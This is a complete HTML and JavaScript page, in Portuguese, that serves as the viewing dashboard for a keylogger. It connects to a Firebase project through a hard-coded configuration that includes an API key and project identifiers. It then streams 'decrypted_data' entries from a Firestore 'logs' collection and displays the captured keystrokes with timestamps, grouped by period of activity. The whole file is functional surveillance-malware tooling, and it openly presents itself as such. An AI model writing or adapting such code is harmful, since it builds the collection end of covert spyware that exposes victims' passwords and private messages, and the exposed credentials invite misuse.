<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quadro de Logs do Keylogger</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .log-box {
            background-color: white;
            width: 80%;
            padding: 20px;
            margin-bottom: 20px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div id="logs-container"></div>

    <!-- Adicione o SDK do Firebase -->
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js"></script>

    <script>
        // Configurações do Firebase (substitua pelas suas próprias configurações)
        const firebaseConfig = {
            apiKey: "AIzaSyD97RPWRXb1ctksvWSvzm3NZ0earAn7Mcc",
            authDomain: "visualizado-realtime.firebaseapp.com",
            databaseURL: "https://visualizado-realtime-default-rtdb.firebaseio.com",
            projectId: "visualizado-realtime",
            storageBucket: "visualizado-realtime.appspot.com",
            messagingSenderId: "279838352172",
            appId: "1:279838352172:web:1f948ee868297e229d8289"
        };

        // Inicialize o Firebase
        firebase.initializeApp(firebaseConfig);

        // Referência para o Firestore
        const db = firebase.firestore();

        // Referência ao elemento do quadro de logs
        const logsContainer = document.getElementById("logs-container");

        // Variáveis para controlar o agrupamento de logs
        let currentLogBox = null; // Caixa de log atual
        let lastLogTime = null; // Último horário de registro de log

        // Função para criar uma nova caixa de log
        function criarNovaCaixaLog() {
            currentLogBox = document.createElement("div");
            currentLogBox.classList.add("log-box");
            logsContainer.appendChild(currentLogBox);
        }

        // Função para adicionar um log à caixa de log atual
        function adicionarLog(log) {
            const paragrafo = document.createElement("p");
            const dataAtual = new Date();
            const dataFormatada = `${dataAtual.toLocaleDateString()} - ${dataAtual.toLocaleTimeString()}: `;
            paragrafo.textContent = dataFormatada + log;
            currentLogBox.appendChild(paragrafo);
        }

        // Função para verificar e criar uma nova caixa de log após 60 minutos sem atividade
        function verificarCriarNovaCaixaLog() {
            const tempoPassado = lastLogTime ? (Date.now() - lastLogTime) / 1000 / 60 : 0; // Em minutos
            if (!currentLogBox || tempoPassado >= 60) {
                criarNovaCaixaLog();
            }
        }

        // Função para exibir logs do Firestore em tempo real
        function exibirLogs() {
            // Cria uma nova caixa de log inicial
            criarNovaCaixaLog();

            // Obtém os logs do Firestore em tempo real
            db.collection("logs").orderBy("timestamp").onSnapshot(snapshot => {
                snapshot.docChanges().forEach(change => {
                    if (change.type === "added") {
                        const log = change.doc.data().decrypted_data;
                        adicionarLog(log);
                        lastLogTime = Date.now(); // Atualiza o último horário de registro de log
                        verificarCriarNovaCaixaLog();
                    }
                });
            });
        }

        // Exibe os logs ao carregar a página
        window.onload = exibirLogs;
    </script>
</body>
</html>
